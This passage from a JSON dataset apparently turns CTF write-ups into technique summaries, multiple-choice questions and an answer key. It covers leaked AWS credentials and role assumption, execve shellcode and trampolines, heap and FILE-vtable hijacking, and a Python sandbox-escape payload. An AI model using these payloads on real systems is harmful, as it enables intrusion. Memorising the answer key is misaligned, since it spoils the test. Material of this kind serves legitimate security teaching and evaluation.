            "When possessing leaked AWS credentials, the first step should involve identifying the associated IAM role or user to understand the permissions and scope of the credentials. This is accomplished using the AWS CLI command `aws sts get-caller-identity`. The output of this command reveals the `UserId`, which includes the role name and session name, the `Account` ID, and the role's ARN, which are crucial for determining the next steps in permission escalation or resource access.",
            "To access AWS resources across account boundaries, it's possible to leverage permissions associated with an IAM role to assume another role in a different account, provided that the `sts:AssumeRole` permission is granted and conditions such as `sts:ExternalId` are satisfied. This technique is particularly useful in scenarios where inter-account resource access is necessary, such as accessing AWS Secret Manager secrets in another account. The AWS CLI command sequence involves first retrieving and analyzing the IAM role's permissions with `aws iam get-policy` and `aws iam get-policy-version`, and then assuming the target role using `aws sts assume-role` with the necessary parameters like `role-arn`, `external-id`, and `role-session-name`. Example payload for assuming a role:\n\n   ```bash\n   aws sts assume-role --role-arn arn:aws:iam::562778112707:role/role_to_secretsmanager_read_flag --external-id nullcon-external-id --role-session-name test\n   ```"
        ],
        "question": [
            "When verifying the permissions and scope of leaked AWS credentials, which AWS CLI command should be used to identify the associated IAM role or user? - A. aws iam get-user - B. aws iam describe-role - C. aws sts get-caller-identity - D. aws configure list ",
            "To assume a role owned by another AWS account with the intent to access secret resources, which condition needs to be provided according to best practices for cross-account access? - A. A matching role name must be provided. - B. The source account must be specified in the command. - C. An `sts:ExternalId` must be specified when assuming the role. - D. The target role's exact permissions need to be mirrored in the source account. "
        ],
        "answer": [
            "C",
            "C"
        ]
    },
    {
        "name": "ein-pfund-mails",
        "write_up": "dataset/raw/ein-pfund-mails.md",
        "type": "misc",
        "competition": [
            "KITCTFCTF/2022",
            "https://ctftime.org/event/1810/tasks/"
        ],
        "score": 440,
        "max_score": 500,
        "difficulty": 0.88,
        "knowledge": [
            "When dealing with a large set of similar data files containing a flag, such as emails, and each file has distinct signatures like DKIM, using a signature verification approach can efficiently identify the unaltered, valid file containing the correct flag. DKIM (DomainKeys Identified Mail) can be particularly useful for verifying the sender and content integrity of an email. This method is relevant in scenarios where integrity and authenticity of each file need to be confirmed to find a valid flag.",
            "Automation with a combination of simple Bash scripts and existing CLI tools (e.g., `check-dkim` for DKIM verification) can significantly streamline the process of checking the integrity and authenticity of multiple files. This approach is effective in scenarios with numerous files where manually verifying each file's integrity is impractical. The Bash script should iterate over each file, using the CLI tool to verify the signature, and flag any files that successfully pass the verification process. Example Bash command:\n   ```bash\n   find \"$1\" -iname *.eml -type f -exec echo -ne \"FILE: {} --- \" \\; -exec check-dkim {} \\;\n   ```"
        ],
        "question": [
            "In a scenario where you need to verify the authenticity and integrity of email files within a large dataset to locate a valid flag, which email authentication method can be specifically utilized to ensure the content has not been altered? - A. SPF (Sender Policy Framework) - B. S/MIME (Secure/Multipurpose Internet Mail Extensions) - C. DKIM (DomainKeys Identified Mail) - D. PGP (Pretty Good Privacy) ",
            "Given the need to automate the process of integrity and authenticity verification of numerous email files, which of the following Bash commands correctly implements a loop over each file in a specified directory, using a CLI tool for signature verification, and outputs the filename and verification result? - A. `for file in $(ls *.eml); do check-spf $file; echo \"FILE: $file --- \"; done` - B. `ls *.eml | xargs -I{} verify-spf -file {}` - C. `find \"$1\" -iname *.eml -type f -exec echo -ne \"FILE: {} --- \" \\; -exec check-dkim {} \\;` - D. `grep -rL \"DKIM verified\" /path/to/email/files | while read file; do echo \"Checking $file\"; done` "
        ],
        "answer": [
            "C",
            "C"
        ]
    },
    {
        "name": "El Primo",
        "write_up": "dataset/raw/El Primo.md",
        "type": "pwn",
        "competition": [
            "TJCTF/2020",
            "https://ctftime.org/event/928/tasks/"
        ],
        "score": 60,
        "max_score": 100,
        "difficulty": 0.6,
        "knowledge": [
            "When encountering binaries with the `gets` function, a buffer overflow vulnerability is likely present, allowing for arbitrary code execution. If NX (No Execute) is disabled for the binary, the attack vector includes injecting shellcode directly into the buffer and executing it. The exploit involves carefully crafting a payload that includes the shellcode, padding if necessary, the adjusted base pointer to preserve stack integrity, and the return address pointing to the injected shellcode. This technique is effectively used when direct execution of injected code is possible due to the absence of execution prevention mechanisms.\n\nExample payload structure: `shellcode + padding + adjusted_ebp + return_address_to_shellcode`",
            "Leaking memory addresses via `printf` or similar functions can be critical in bypassing ASLR (Address Space Layout Randomization) by revealing exact memory addresses in use by the application. In the scenario where an application leaks a buffer's memory address, this information can be utilized to dynamically calculate other relevant addresses (such as the return address or variables' addresses) needed for crafting an exploit payload, specifically when direct memory address manipulation is required to achieve code execution.\n\nExample technique application: `buf_addr` variable used to calculate `ebp_value` and finalize the payload with `p32(buf_addr)` pointing to the start of the injected shellcode"
        ],
        "question": [
            "When attempting to exploit a binary where the `gets` function is used, which of the following scenarios makes it possible to inject and execute shellcode directly into the buffer? - A. ASLR is enabled, and stack canaries are present - B. NX is enabled, and stack canaries are disabled - C. NX is disabled, allowing direct execution of injected code - D. Stack canaries are disabled, but PIE (Position Independent Executables) is enabled",
            "In an exploitation scenario, how can the leaked address of a buffer via `printf` function be utilized effectively when crafting an exploit? - A. It can be used as a random seed to predict other memory addresses due to ASLR. - B. It helps in determining the size of the buffer to avoid overflow. - C. It allows bypassing NX by providing a direct address to execute. - D. It aids in dynamically calculating other relevant addresses for the payload."
        ],
        "answer": [
            "C",
            "D"
        ]
    },
    {
        "name": "Elegant Curve",
        "write_up": "dataset/raw/Elegant Curve.md",
        "type": "crypto",
        "competition": [
            "Crypto/2021",
            "https://ctftime.org/event/1258/tasks/"
        ],
        "score": 217,
        "max_score": 477,
        "difficulty": 0.4549266247379455,
        "knowledge": [
            "For challenges involving solving discrete logarithms on Elliptic Curve Cryptography (ECC), if given anomalous curve parameters and a prime `p` that is not too large, the Smart's Attack can be applied effectively. Smart's Attack utilizes the properties of an anomalous curve (an elliptic curve over a field F_p with exactly p points) to compute discrete logarithms efficiently. This method is particularly useful when traditional discrete logarithm problem (DLP) solvers are infeasible due to computational constraints.",
            "When provided with two elliptic curves over finite fields, if the order of one curve is smooth (the prime factorization of the curve's order only contains small prime numbers), it's feasible to employ the Pohlig-Hellman algorithm to solve the discrete logarithm problem for that curve. This approach takes advantage of the smoothness of the curve's order to break the DLP into smaller, more manageable problems. This strategy works best when the largest prime factor of the curve's order is significantly smaller than the order itself, reducing the complexity of the DLP to that of solving multiple smaller DLPs.\n\nSample Python code block to implement Smart's Attack (specifically tailored and simplified to fit within the provided scenario context, but adjustable for general use):\n\n```python\nfrom sage.all import *\n\ndef SmartAttack(P, Q, p):\n    \"\"\"\n    Solve discrete logarithm for P, Q on an elliptic curve over a finite field of prime order p using Smart's attack.\n    :param P: Base point on the elliptic curve.\n    :param Q: Target point on the elliptic curve.\n    :param p: Prime order of the finite field.\n    :return: The discrete logarithm of Q to the base P.\n    \"\"\"\n    E = P.curve()\n    Eqp = EllipticCurve(Qp(p, 2), [ZZ(t) + randint(0, p)*p for t in E.a_invariants()])\n\n    P_Qps = Eqp.lift_x(ZZ(P.xy()[0]), all=True)\n    for P_Qp in P_Qps:\n        if GF(p)(P_Qp.xy()[1]) == P.xy()[1]:\n            break\n\n    Q_Qps = Eqp.lift_x(ZZ(Q.xy()[0]), all=True)\n    for Q_Qp in Q_Qps:\n        if GF(p)(Q_Qp.xy()[1]) == Q.xy()[1]:\n            break\n\n    phi_P = -(P_Qp.xy()[0]/P_Qp.xy()[1])\n    phi_Q = -(Q_Qp.xy()[0]/Q_Qp.xy()[1])\n    k = phi_Q / phi_P\n    return ZZ(k)\n```\n\nNote: The use of SageMath (imported as `sage.all`) is necessary for ECC operations, `Qp`, and other algebraic manipulations provided in the code."
        ],
        "question": [
            "In the context of performing a Smart's Attack on an elliptic curve, which mathematical property must the curve possess to be considered anomalous, thus making Smart's Attack applicable? - A. The curve must have a cyclic group structure. - B. The curve must have exactly p points over the field F_p. - C. The curve must be supersingular. - D. The curve must have a complex multiplication structure.",
            "When solving the discrete logarithm problem on an elliptic curve whose order is smooth, which algorithm is most appropriate due to its ability to exploit the smoothness of the curve's order? - A. The Schoof's algorithm - B. The Elliptic Curve Method (ECM) - C. The Lenstra elliptic-curve factorization - D. The Pohlig-Hellman algorithm"
        ],
        "answer": [
            "B.",
            "D."
        ]
    },
    {
        "name": "Elements",
        "write_up": "dataset/raw/Elements.md",
        "type": "The type of this CTF challenge is **crypto**.",
        "competition": [
            "0CTF/2019/Quals",
            "https://ctftime.org/event/736/tasks/"
        ],
        "score": 107,
        "max_score": 1000,
        "difficulty": 0.107,
        "knowledge": [
            "When faced with optimization problems in CTF challenges, especially those involving error-prone floating-point computations, the Covariance Matrix Adaptation Evolution Strategy (CMA-ES) can be an effective method for finding approximate solutions that meet given constraints. CMA-ES excels in dealing with noisy functions where traditional optimization approaches might struggle. This approach is applicable when precise values are difficult to calculate directly or through simple brute force alone. The technique is particularly useful for adjusting variables to satisfy multiple constraints simultaneously, as demonstrated with the circumradius and inradius constraints.\n\n```python\nimport cma\nfrom math import sqrt\n\n# Example setup based on challenge requirements\nks = 0x391BC2164F0A\nkr = 1.940035480806554e13\nkR = 4.777053952827391e13\n\ndef radiusFit(s):\n    # Implementation of the error function based on problem constraints\n    return abs(distr) + abs(distR)\n\n# Optimization process\nes = cma.CMAEvolutionStrategy([initial_guesses], sigma)\nes.optimize(radiusFit)\n```",
            "If an optimization technique like CMA-ES brings a solution close to the correct answer within a small error margin, brute-forcing within a limited range around the obtained values can efficiently pinpoint the exact solution. This strategy leverages the strength of optimization algorithms to reduce the search space significantly, thus making brute force a viable next step. This approach is most suitable when the exact solution is required, and the search space has been narrowed to a feasible size where brute-forcing will not be computationally prohibitive.\n\n```python\nimport subprocess\nfrom multiprocessing.dummy import Pool as ThreadPool\n\n# Adjusted values from optimization step\nd = [0x391BC2164F0A, optimized_value1, optimized_value2]\n\nDELTARANGE = 0x100  # Defined range for brute-forcing based on optimization results\n\ndef run(d1):\n    # Brute-forcing logic to adjust values within the DELTARANGE\n    return payload\n\n# Parallel brute-forcing to expedite the search\npool = ThreadPool(8)\nresults = pool.map(run, list(range(-DELTARANGE, DELTARANGE + 1)))\n```"
        ],
        "question": [
            "In the context of solving optimization problems in CTF challenges involving noisy functions and error-prone floating-point computations, which method is best suited for approximating solutions that satisfy complex constraints, such as specific properties of a triangle (e.g., side lengths, inradius, circumradius)?  - A. Gradient Descent - B. Covariance Matrix Adaptation Evolution Strategy (CMA-ES) - C. Linear Programming - D. Simplex Algorithm ",
            "When an optimization technique like CMA-ES has narrowed down the possible solution to a problem within a small error margin, but the exact value is needed, what is the next best step to find the precise answer given the context is about a CTF challenge where specific triangle properties must be met?  - A. Apply a different optimization algorithm to refine the solution. - B. Manually check each value within the error margin. - C. Use brute force within a defined range around the approximated values. - D. Increase the complexity of the CMA-ES algorithm to reduce the error margin. "
        ],
        "answer": [
            "B",
            "C"
        ]
    },
    {
        "name": "elf-crafting-v1",
        "write_up": "dataset/raw/elf-crafting-v1.md",
        "type": "pwn",
        "competition": [
            "AmateursCTF/2023",
            "https://ctftime.org/event/1983/tasks/"
        ],
        "score": -1,
        "max_score": 500,
        "difficulty": -1,
        "knowledge": [
            "When analyzing binary challenges, especially those involving file operations and execution, `memfd_create` and `fexecve` functions indicate an opportunity for executing shellcode or commands in memory by creating an anonymous file in RAM. This technique is useful for executing arbitrary code supplied by the user without touching the file system, thus avoiding detection based on file system activities.",
            "To execute command lines or scripts via file descriptors passed to `fexecve`, prepend the input with a shebang (`#!`) followed by the command to be executed. This approach exploits the functionality of `fexecve` to execute the program referred to by a file descriptor, allowing for the execution of scripts or commands directly from memory.\n   - Example payload for executing `/bin/cat` to read the flag: `#!/bin/cat flag.txt`"
        ],
        "question": [
            "In a cybersecurity challenge involving executing commands without writing to the filesystem, which Linux function allows for the creation of an anonymous file in memory that can be executed, thus avoiding file system detection? - A. `fopen()` - B. `execve()` - C. `memfd_create()` - D. `tmpfile()`",
            "During a cybersecurity challenge, you are provided with a file descriptor and need to execute a script or command directly from memory. What syntax should be used at the beginning of the input to `fexecve` to achieve this? - A. `./` - B. `#include` - C. `/*@` - D. `#!`"
        ],
        "answer": [
            "C",
            "D"
        ]
    },
    {
        "name": "Elgyem's Password",
        "write_up": "dataset/raw/Elgyem's Password.md",
        "type": "web",
        "competition": [
            "UMDCTF/2023",
            "https://ctftime.org/event/1949/tasks/"
        ],
        "score": 500,
        "max_score": 500,
        "difficulty": 1.0,
        "knowledge": [
            "When dealing with machine learning (ML) models in a CTF challenge that only use linear layers (e.g., a sequence of linear transformations without non-linear activation functions), it's possible to simplify the model into a single linear equation by combining all the weights and biases. This simplification is based on the mathematical property that sequential linear transformations can be combined into one. This approach reduces the complexity of the model, making it easier to analyze or manipulate, especially in challenges requiring understanding or inverting the model's computations.\n   \n   To combine two linear layers:\n   \\[\n   a_{j} = a_0 \\prod_{i=0}^{j-1} w_i    + \\sum_{i=0}^{j-1} b_i \\prod_{k=i+1}^{j-1} w_k\n   \\]\n   where \\(a_j\\) is the activation (output) of layer \\(j\\), \\(a_0\\) is the input, \\(w_i\\) are the weight matrices, and \\(b_i\\) are the bias vectors.",
            "When finding inputs to produce a specific output from an ML model, and when accurate numeric computation is crucial, using a solver that supports constraints and arbitrary precision arithmetic can be effective. Z3 Theorem Prover is particularly useful for problems where the inputs and/or structure of the data have known characteristics (e.g., starting pattern of the input, integer values). In such a scenario, you can model the problem as a set of linear equations with constraints based on these characteristics and use Z3 to find solutions that satisfy both the equations and the constraints.\n\n   Example of setting constraints with Z3 for known input patterns:\n   \\[\n   \\text{Let } input[0..7] = \\text{ASCII encoding of } 'UMDCTF{\\{' \n   \\]\n   And then use Z3 to solve for the rest of the input, ensuring each character is an integer value within the expected range (e.g., ASCII printable characters)."
        ],
        "question": [
            "In a machine learning challenge requiring model inversion, you're analyzing a purely linear model with multiple layers, aiming to simplify the computations. Given the model's structure where each layer performs a linear transformation (matrix multiplication followed by adding a bias), which mathematical approach allows for simplifying the entire model to a single linear transformation?  - A. Taking the derivative of each layer and summing them up - B. Multiplying the weight matrices and summing the biases of all layers appropriately - C. Applying a non-linear activation function between each layer and summing the results - D. Separating each layer's bias and weights and treating them as independent models ",
            "When aiming to find a specific input for a machine learning model that outputs a known pattern and where precision is key, which tool and approach would be most suitable, especially when initial parts of the input and its integer nature are known?  - A. Using a genetic algorithm with fitness functions approximating the target output - B. Utilizing Z3 Theorem Prover to set constraints on the input pattern and solve for the rest using linear equations - C. Applying gradient descent to minimize the difference from the expected output without considering input constraints - D. Employing random search with enforced type casting to integers after each iteration "
        ],
        "answer": [
            "B",
            "B"
        ]
    },
    {
        "name": "elytra",
        "write_up": "dataset/raw/elytra.md",
        "type": "crypto",
        "competition": [
            "WolvCTF/2023",
            "https://ctftime.org/event/1866/tasks/"
        ],
        "score": 50,
        "max_score": 700,
        "difficulty": 0.07142857142857142,
        "knowledge": [
            "When dealing with challenges that involve comparing two texts or files, differences in line endings (e.g., `\\r\\n` vs. `\\n`) can be a deliberate hint or manipulation to encode information, such as binary data that can be translated into a flag. Condition: This approach is effective when the challenge hints at or involves discrepancies between two seemingly identical texts or files.\n   - Sample observation: Some lines in a provided file are terminated with `\\r\\n`, while others are terminated with `\\n`.",
            "Binary data can be encoded based on the presence or absence of specific characters or sequences at the end of lines within a text. This method can be decoded by converting sequences (e.g., `1` for `\\r` and `0` for the absence of `\\r`) back into characters or readable format to extract hidden information or flags. Condition: This is particularly useful when a challenge provides a file with subtle variations in formatting or encoding that don't immediately appear to carry meaning.\n   - Sample payload: `int(''.join(['1' if x[-1] == '\\r' else '0' for x in text.split('\\n') if len(x) > 0]),2)` converts the line-ending pattern to binary, which is then converted to bytes and decoded to reveal the flag."
        ],
        "question": [
            "In the context of analyzing text for hidden messages in a cybersecurity challenge, when comparing two versions of a text file, one of which has differences in line endings to encode binary data, which of the following considerations is crucial for revealing hidden information? - A. Counting the total number of characters in both files to find a secret key. - B. Identifying and decoding variations in text formatting and line endings that represent binary data. - C. Modifying the text to ensure uniform line endings before comparison. - D. Translating each word into a numerical value based on its position in the text.",
            "When given a file where binary data is encoded based on the presence (`\\r`) or absence of specific characters or sequences at the end of lines, which of these Python expressions correctly extracts the encoded binary data by converting `\\r`-terminated lines to '1' and non-`\\r`-terminated lines to '0', for further decryption? - A. `int(''.join(['1' if 'r' in x else '0' for x in text.split('\\n')]), 2)` - B. `int(''.join(['1' if x.endswith('\\r\\n') else '0' for x in text.splitlines()]), 2)` - C. `int(''.join(['1' if x[-1] == '\\r' else '0' for x in text.split('\\n') if len(x) > 0]), 2)` - D. `\"\".join(['1' if '\\r\\n' in x else '0' for x in text])`"
        ],
        "answer": [
            "B.",
            "C."
        ]
    },
    {
        "name": "Encoding",
        "write_up": "dataset/raw/Encoding.md",
        "type": "This is a crypto challenge.",
        "competition": [
            "1337UP/2023",
            "https://ctftime.org/event/2134/tasks/"
        ],
        "score": -1,
        "max_score": 50,
        "difficulty": -1,
        "knowledge": [
            "When confronted with an encoded message that does not fit common cryptographic methods (e.g., Caesar cipher, monoalphabetic substitution), consider the possibility of it being in an encoding format like base32, especially if the ciphertext consists solely of uppercase letters and equals signs. After base32 decoding, further transformations might be required depending on the context, such as URL decoding or interpreting as Morse code.\n    - Example for base32 decoding (Python): `import base64; decoded_msg = base64.b32decode('ENCODED_MESSAGE')`",
            "Encoded messages might be layered with multiple encoding schemes. It's critical to recognize patterns or hints that suggest a specific encoding. After decoding from one format, the output should be carefully analyzed to determine if it represents another form of encoded data, such as hexadecimal, Morse code, or base64. Each layer must be decoded sequentially to unveil the hidden message or flag.\n    - Hex to text decoding (Python example): `bytearray.fromhex('HEX_STRING').decode()`  \n    - Base64 decoding (Python example): `import base64; base64.b64decode('BASE64_STRING')`"
        ],
        "question": [
            "Given a string of text that consists only of uppercase letters, which encoding technique should be considered first, especially if the text doesn't match common encryption patterns? - A. Hexadecimal encoding - B. Base32 encoding - C. AES encryption - D. ROT13 cipher",
            "In a scenario where after decoding a message from one encoding format, it reveals a pattern or characters suggesting another type of encoded data, such as \"..--- ...\" for Morse code or \"%EF%BF%BD\" for URL encoded characters, what is the next logical step in uncovering the hidden message? - A. Repeat the same decoding process with the same format - B. Analyze the pattern to identify the encoding and decode sequentially with the appropriate methods - C. Ignore the pattern as it's likely to be a decryption error - D. Convert the output directly to ASCII without further decoding"
        ],
        "answer": [
            "B. Base32 encoding",
            "B. Analyze the pattern to identify the encoding and decode sequentially with the appropriate methods"
        ]
    },
    {
        "name": "Encrypt0r",
        "write_up": "dataset/raw/Encrypt0r.md",
        "type": "crypto",
        "competition": [
            "0x41414141/2021",
            "https://ctftime.org/event/1249/tasks/"
        ],
        "score": 492,
        "max_score": 1000,
        "difficulty": 0.492,
        "knowledge": [
            "When dealing with an RSA encryption challenge where you have access to an encryption oracle, you can find the modulus `n` by noticing how special values are encrypted. Specifically, encrypting `-1` can return `n - 1` due to modular arithmetic properties, instantly revealing `n` when `n - 1` is added by 1.",
            "To find the RSA encryption exponent `e` when the modulus `n` is known, especially when common values like `e = 65537` do not apply, iterate over potential values of `e` by encrypting a known value (such as 2) with each potential `e` until the output matches the encrypted output provided by the challenge, then solve for `e`. A Python sample for iterating over `e` values:\n```python\nn = 943005855809379805541572246085636463198876208104363395594608 + 1\nenc_2 = 405518048190558088634310202493589629933137815074909354184258\ntmp = 1\nfor guessed_e in range(2 ** 17):\n   if tmp == enc_2:\n       print(guessed_e)  # This prints the correct value of e\n       break\n   tmp *= 2\n   tmp %= n\n```"
        ],
        "question": [
            "In a scenario where you're cracking an RSA encryption challenge and have access to an encryption oracle, how would you determine the modulus \\(n\\) if encrypting a special value provides insight into \\(n\\)? Assume you observe that encrypting \\(-1\\) returns a result that, when increased by 1, equals \\(n\\). - A. Calculate \\(n\\) directly from the public key. - B. Encrypt \\(1\\) and subtract \\(1\\) from the result to get \\(n\\). - C. Encrypt \\(-1\\) to get \\(n - 1\\), then add \\(1\\) to the result to find \\(n\\). - D. Use a brute force attack to guess \\(n\\) based on the size of the encrypted output.",
            "To find the RSA encryption exponent \\(e\\) when the modulus \\(n\\) is known in a situation where you are provided with an encrypted value of \\(2\\), which of the following Python code samples correctly describes the process of iterating over potential values of \\(e\\) to find the one that matches the encrypted output provided by the challenge? - A. Iterate over potential \\(e\\) values by squaring \\(2\\) until the encrypted output matches, then divide \\(n\\) by \\(2\\). - B. Iterate over potential \\(e\\) values by adding \\(2\\) to a temporary variable until the encrypted output matches, using the temporary variable modulo \\(n\\). - C. Use a fixed \\(e\\) value of \\(65537\\) and calculate \\(2^{e} \\mod n\\), checking if the result matches the encrypted output. - D. Iterate over potential \\(e\\) values, doubling a temporary variable, and using modulo \\(n\\) until the output matches the encrypted output provided, printing the current \\(e\\)."
        ],
        "answer": [
            "C.",
            "D."
        ]
    },
    {
        "name": "Encryption Service",
        "write_up": "dataset/raw/Encryption Service.md",
        "type": "pwn",
        "competition": [
            "UTCTF/2019",
            "https://ctftime.org/event/757/tasks/"
        ],
        "score": 1200,
        "max_score": 2000,
        "difficulty": 0.6,
        "knowledge": [
            "In challenges featuring heap vulnerabilities, if a program does not clear or nullify pointers after freeing memory, it can lead to use-after-free vulnerabilities. These vulnerabilities can be exploited by allocating controlled data in the freed object's place, enabling control over function pointers or metadata for further exploitation.",
            "For heap exploitation, particularly in scenarios involving the manipulation of the heap to achieve arbitrary code execution, using size allocations that transition objects between different bin types (e.g., fastbins to smallbins) can be crucial for bypassing restrictions such as null byte limitations. This technique can leverage the behavior of bins (like unsorted bins coalescing and changing size) to perform targeted overwrites, such as null byte overwrites, to corrupt heap metadata or function pointers for control flow hijacking."
        ],
        "question": [
            "Considering a scenario in a heap exploitation challenge, wherein a function fails to nullify the pointer after freeing memory, leading to a use-after-free vulnerability. Which of the following actions can be performed by an attacker to exploit this vulnerability for arbitrary code execution? - A. Increasing the heap's size to trigger an out-of-memory error that crashes the system. - B. Allocating controlled data in the location of the freed object to manipulate function pointers or metadata. - C. Encrypting the heap memory to prevent further allocations. - D. Releasing all other allocated objects to clean up the heap and mitigate the vulnerability.",
            "During heap exploitation, leveraging the behavior of different bin types is critical for bypassing certain limitations. If an attacker transitions objects between fastbins to smallbins by controlling the size of allocations, which of the following outcomes is a direct consequence that can be exploited, particularly when dealing with a null byte limitation? - A. The fastbins' single-linked list nature allows for straightforward linked list corruption. - B. Smallbin allocations do not check for null bytes, leading to infinite looping in the allocation process. - C. Transitioning to smallbins can exploit the coalescing behavior of unsorted bins to perform targeted overwrites, such as null byte overwrites on heap metadata or pointers. - D. Allocating large objects in fastbins to trigger an immediate segmentation fault for denial-of-service attacks."
        ],
        "answer": [
            "B",
            "C"
        ]
    },
    {
        "name": "endless_wait",
        "write_up": "dataset/raw/endless_wait.md",
        "type": "reverse",
        "competition": [
            "boot2root/2020",
            "https://ctftime.org/event/1202/tasks/"
        ],
        "score": 473,
        "max_score": 496,
        "difficulty": 0.9536290322580645,
        "knowledge": [
            "In reverse engineering challenges involving anti-debugging techniques, identifying and neutralizing ptrace calls is essential for effective debugging. Tools like NOP (No Operation) slides can be employed to bypass these checks, allowing for a clearer analysis of the binary.\n   - Example approach to neutralize ptrace: Replace the ptrace call with NOP instructions using a binary editor or patching tool.",
            "When dealing with obfuscated strings or runtime-generated arrays within a binary, a methodical approach to analyze and de-obfuscate these strings can reveal hidden information or flags. Identifying the pattern or algorithm used to encode the string and applying the inverse operation can extract the flag.\n   - Example de-obfuscation technique: If a runtime array encodes a flag by interleaving irrelevant characters (e.g., every third character is part of the flag), writing a simple script or using manual analysis to extract the relevant characters can recover the flag."
        ],
        "question": [
            "When reverse engineering a binary that employs ptrace for anti-debugging, which technique can be effectively used to bypass the ptrace check in order to debug the binary? - A. Replace the ptrace call with NOP instructions. - B. Encrypt the binary to prevent ptrace from recognizing its signatures. - C. Use a virtual machine to obscure the debugging process from ptrace. - D. Increase the binary's privilege to avoid ptrace detection. ",
            "Given a binary that obfuscates a flag using a runtime-generated array where the flag characters are interleaved with irrelevant characters, which technique is appropriate for de-obfuscating and retrieving the flag? - A. Reverse every character in the runtime array. - B. Extract every third character from the runtime-generated array to form the flag. - C. Convert each character in the runtime array to its ASCII value, then subtract a fixed number. - D. Search for a static string within the binary that matches the pattern of the runtime array. "
        ],
        "answer": [
            "A",
            "B"
        ]
    },
    {
        "name": "engineOnline",
        "write_up": "dataset/raw/engineOnline.md",
        "type": "reverse",
        "competition": [
            "0CTF/2017/Quals",
            "https://ctftime.org/event/402/tasks/"
        ],
        "score": 578,
        "max_score": 687,
        "difficulty": 0.8413391557496361,
        "knowledge": [
            "When exploiting binary programs that allow unrestricted write operations based on a controlled offset (\"ip\" in this context), an effective strategy is to manipulate the memory layout to inject malicious payloads or modify the program's execution flow. Specifically, arranging the input memory to be mapped above critical sections (like libc) enables the overwriting of sensitive structures or function pointers. This is often achieved by creating a sufficiently large input buffer, positioning it strategically in memory to overwrite target areas without directly addressing them, ensuring exploitation under constraints or specific memory layouts.",
            "For leaking address space layout randomization (ASLR) or gaining control over execution flow via library functions, manipulating file stream objects (like stderr) is a practical approach. Altering the vtable of such objects to point to controlled or fake vtables can lead to arbitrary code execution when library functions (e.g., _IO_flush_all_lockp) are subsequently called by the program. By partially overwriting the vtable pointer or the function pointers within the vtable to point to plt entries (e.g., gets_plt) or system, attackers can execute arbitrary commands or gain a shell. This method hinges on knowing the layout of libc and the binary in memory, plus having the ability to write to critical memory structures (like the vtable).\n\nExample payload steps: \n- Use the \"ip\" operation to modify stderr to point to a fake vtable.\n- Leak libc addresses using \"op\" to determine the base address.\n- Craft the fake vtable and stderr content to execute `system(\"/bin/sh\")` upon triggering a function call, typically set up to be invoked by standard program operations or cleanup routines."
        ],
        "question": [
            "In the context of exploiting binary programs where you have the ability to write to arbitrary memory locations below the input memory, which of the following strategies would best facilitate the injection of a malicious payload or modification of the program's execution flow? - A. Decrease the size of the input memory buffer to restrict memory access to executable sections. - B. Position the input memory to be mapped above critical sections like the libc to overwrite sensitive structures. - C. Only modify memory locations that are directly addressable and within the immediate vicinity of the input buffer. - D. Focus on modifying upper memory regions far beyond the libc section to avoid detection.",
            "When attempting to leak address space layout randomization (ASLR) information or gain control over execution flow via manipulating file stream objects in a binary exploitation scenario, which of the following steps correctly outlines the method to alter such objects for arbitrary code execution? - A. Change the global offset table (GOT) entries to point directly to malicious code segments. - B. Modify the stack's return addresses to directly execute shellcode without interfering with file streams. - C. Alter the vtable of file stream objects, like stderr, to point to a fake vtable, enabling execution of functions like system on program exit. - D. Increase the size of environmental variables to overwrite file stream pointers with shellcode addresses."
        ],
        "answer": [
            "B",
            "C"
        ]
    },
    {
        "name": "Erna Hoover",
        "write_up": "dataset/raw/Erna Hoover.md",
        "type": "pwn",
        "competition": [
            "CyberHeroines/2023",
            "https://ctftime.org/event/2054/tasks/"
        ],
        "score": 200,
        "max_score": 400,
        "difficulty": 0.5,
        "knowledge": [
            "In scenarios where NX (No Execute) protections are disabled allowing execution of shellcode from the stack, one can inject a larger shellcode into an input buffer that is sufficiently sized and use a smaller trampoline shellcode to jump to this larger payload. This method is practical when there are restrictions on the size of directly executable shellcode. Example payloads for the trampoline and the larger shellcode are as follows:\n   - Trampoline Shellcode: `add rsp, 120; jmp rsp;`\n   - Larger Shellcode: \n   ```\n   xor eax, eax  \n   mov rbx, 0xFF978CD091969DD1  \n   neg rbx  \n   push rbx  \n   push rsp  \n   pop rdi  \n   cdq  \n   push rdx  \n   push rdi  \n   push rsp  \n   pop rsi  \n   mov al, 0x3b  \n   syscall  \n   ```",
            "When all security measurements except Partial RELRO are disabled in a challenge binary, it is advantageous to use existing protections' weaknesses such as executable stack space and no PIE (Position Independent Executable) to accurately target buffer addresses for exploit payloads. This approach bypasses the need to guess or leak addresses dynamically. In practical terms, knowing the binary does not employ Address Space Layout Randomization (ASLR) allows hardcoding payload addresses or calculating them relative to static landmarks like the `rsp` (stack pointer) register."
        ],
        "question": [
            "In a Capture the Flag (CTF) challenge where NX (No Execute) protections are disabled, allowing the execution of code directly from the stack, an attacker can enter a smaller set of instructions to redirect execution to a larger payload elsewhere in memory. This technique is particularly useful when there are limitations on the amount of executable code that can be directly entered. Given this setup, which of the following payloads demonstrates a correct approach for such a \"trampoline\" shellcode to jump to a larger shellcode area allocated elsewhere?  - A. `mov esi, 120; jmp esi;` - B. `sub rsp, 120; jmp rsp;` - C. `add rsp, 120; jmp rsp;` - D. `inc rsp; dec rsp; jmp rsp;` ",
            "Consider a CTF challenge where the binary being exploited has all security measures disabled with the exception of Partial RELRO. In such a scenario, the binary does not employ Address Space Layout Randomization (ASLR), and executable stack space is available. This means that exploit payloads can use static or predictable addresses, taking advantage of the lack of PIE (Position Independent Executable). Given this information, which exploitation technique is most directly facilitated by the absence of ASLR and the executable stack condition?  - A. Using Return-Oriented Programming (ROP) chains compiled from the binary\u2019s own instructions. - B. Injecting shellcode into the stack and executing it directly without needing to bypass ASLR. - C. Exploiting heap vulnerabilities through the use of uninitialized pointers. - D. Conducting a timing attack to determine the appropriate execution flow. "
        ],
        "answer": [
            "C",
            "B"
        ]
    },
    {
        "name": "escaped",
        "write_up": "dataset/raw/escaped.md",
        "type": "This CTF challenge is of type: `misc`",
        "competition": [
            "WolvCTF/2023",
            "https://ctftime.org/event/1866/tasks/"
        ],
        "score": 50,
        "max_score": 700,
        "difficulty": 0.07142857142857142,
        "knowledge": [
            "In a Python sandbox escape challenge, where the user input is sanitized to start and end with a double quote without including any literal double quotes within, escaping the quote check can be achieved using escape sequences. Specifically, `\\x22` can be utilized to represent a double quote in hexadecimal form, thereby bypassing the input restrictions. This technique allows for the execution of arbitrary Python commands within the constrained environment. Example payload: `\" \\x22+open('flag.txt').read()+\\x22 \"`",
